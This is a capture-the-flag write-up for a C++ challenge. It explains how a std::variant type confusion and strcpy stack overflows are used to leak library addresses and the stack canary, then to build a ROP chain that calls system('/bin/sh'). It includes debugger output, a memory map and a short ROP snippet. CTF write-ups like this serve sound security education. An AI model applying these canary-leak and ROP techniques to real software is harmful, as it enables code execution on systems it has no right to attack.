# Not So Tiger

This challenge is a C++ type confusion using `std::variant`.

There are three stack buffer overflows: One when giving a new cat a name, and another when changing a cat's name, and another in the strcpy in the `set` method for the two cats that have fixed-length char arrays for the name.

The problem is there are stack canaries, so we need to leak the canary in order to be able to smash the stack and do ROP.

Ocelot looks like this:

```
  long age;
  char name[0x20];
```

Bengal looks like this:

```
  char *name;
  long age;
```

From reversing the binary, we see that the std::variant leaves 0x28 bytes for the (largest possible) type itself, and then at offset 0x28 is the index of the class (0 = Bengal, 1 = Ocicat, 2 = Ocelot, 3 = Savannah -- this is just from the order of the types in the std::variant<...> declaration). 


We come up with the following scenario for a leak:

1. Create an Ocelot with 'age' being a pointer to somewhere we want to leak
2. Use the overflow caused by the strcpy of the name in Ocelot's `set` method to overwrite the type index on the std::varaint to be '0' (a Bengal)
3. Read from the Cat...  `char *name` will have the same value as the `age` we controlled... This gives us an leak.


What do we want to leak? In GEF I literally just did the following to see where the canary is in memory:

```
gef➤  canary
[+] Found AT_RANDOM at 0x7fffffffe679, reading 8 bytes
[+] The canary of process 14665 is 0xbd4cbc2d915d3500
gef➤  search-pattern 0xbd4cbc2d915d3500
[+] Searching '\x00\x35\x5d\x91\x2d\xbc\x4c\xbd' in memory
[+] In (0x7ffff7a70000-0x7ffff7a74000), permission=rw-
  0x7ffff7a72f68 - 0x7ffff7a72f88  →   "\x00\x35\x5d\x91\x2d\xbc\x4c\xbd[...]" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffe258 - 0x7fffffffe278  →   "\x00\x35\x5d\x91\x2d\xbc\x4c\xbd[...]" 
  0x7fffffffe328 - 0x7fffffffe348  →   "\x00\x35\x5d\x91\x2d\xbc\x4c\xbd[...]" 
gef➤  
```

0x7ffff7a72f68 is in this RW section that is unlabeled but appears to be immediately before the other libraries. 

```
          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 /home/andrew/cake/no-so-tiger/not_so_tiger/chall
            0x401000           0x404000     0x3000     0x1000 /home/andrew/cake/no-so-tiger/not_so_tiger/chall
            0x404000           0x406000     0x2000     0x4000 /home/andrew/cake/no-so-tiger/not_so_tiger/chall
            0x407000           0x408000     0x1000     0x6000 /home/andrew/cake/no-so-tiger/not_so_tiger/chall
            0x408000           0x409000     0x1000     0x7000 /home/andrew/cake/no-so-tiger/not_so_tiger/chall
            0x409000           0x42a000    0x21000        0x0 [heap]
      0x7ffff7a70000     0x7ffff7a74000     0x4000        0x0 
      0x7ffff7a74000     0x7ffff7a77000     0x3000        0x0 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
      0x7ffff7a77000     0x7ffff7a89000    0x12000     0x3000 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
      0x7ffff7a89000     0x7ffff7a8d000     0x4000    0x15000 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
      0x7ffff7a8d000     0x7ffff7a8e000     0x1000    0x18000 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
      0x7ffff7a8e000     0x7ffff7a8f000     0x1000    0x19000 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1
      0x7ffff7a8f000     0x7ffff7a9e000     0xf000        0x0 /usr/lib/x86_64-linux-gnu/libm-2.31.so
      0x7ffff7a9e000     0x7ffff7b45000    0xa7000     0xf000 /usr/lib/x86_64-linux-gnu/libm-2.31.so
      0x7ffff7b45000     0x7ffff7bdc000    0x97000    0xb6000 /usr/lib/x86_64-linux-gnu/libm-2.31.so
      0x7ffff7bdc000     0x7ffff7bdd000     0x1000   0x14c000 /usr/lib/x86_64-linux-gnu/libm-2.31.so
      0x7ffff7bdd000     0x7ffff7bde000     0x1000   0x14d000 /usr/lib/x86_64-linux-gnu/libm-2.31.so
      0x7ffff7bde000     0x7ffff7c03000    0x25000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7c03000     0x7ffff7d7b000   0x178000    0x25000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7d7b000     0x7ffff7dc5000    0x4a000   0x19d000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7dc5000     0x7ffff7dc6000     0x1000   0x1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7dc6000     0x7ffff7dc9000     0x3000   0x1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7dc9000     0x7ffff7dcc000     0x3000   0x1ea000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
      0x7ffff7dcc000     0x7ffff7dd0000     0x4000        0x0 
      0x7ffff7dd0000     0x7ffff7e66000    0x96000        0x0 /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.28
      0x7ffff7e66000     0x7ffff7f57000    0xf1000    0x96000 /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.28
      0x7ffff7f57000     0x7ffff7fa0000    0x49000   0x187000 /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.28
      0x7ffff7fa0000     0x7ffff7fa1000     0x1000   0x1d0000 /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.28
      0x7ffff7fa1000     0x7ffff7fac000     0xb000   0x1d0000 /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.28
      0x7ffff7fac000     0x7ffff7faf000     0x3000   0x1db000 /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.28
      0x7ffff7faf000     0x7ffff7fb4000     0x5000        0x0 
      0x7ffff7fc9000     0x7ffff7fcd000     0x4000        0x0 [vvar]
      0x7ffff7fcd000     0x7ffff7fcf000     0x2000        0x0 [vdso]
      0x7ffff7fcf000     0x7ffff7fd0000     0x1000        0x0 /usr/lib/x86_64-linux-gnu/ld-2.31.so
      0x7ffff7fd0000     0x7ffff7ff3000    0x23000     0x1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
      0x7ffff7ff3000     0x7ffff7ffb000     0x8000    0x24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

But we assume ASLR is on so we need to leak some library address and then add the right offset to compute the address of the canary. (*Then* we can actually leak the canary itself).

I found some random stdlibc++ address at 0x407cf0, and address offsets were determined experimentally by attaching GDB and printing out the address of the canary and the address I was able to leak. 

After I leaked the canary (byte by byte, in case there were any newlines or nulls), it was time to ROP.

We already have a libc-leak so just compute some more offsets to get a `system` address and a "/bin/sh" address. The ROP itself is simple:

```
rop += p64(0x0000000000403a33) # pop rdi; ret
rop += p64(bin_sh_addr)
rop += p64(0x403a34) # ret; (for alignment)
rop += p64(system_addr)
```

See solve-cats.py
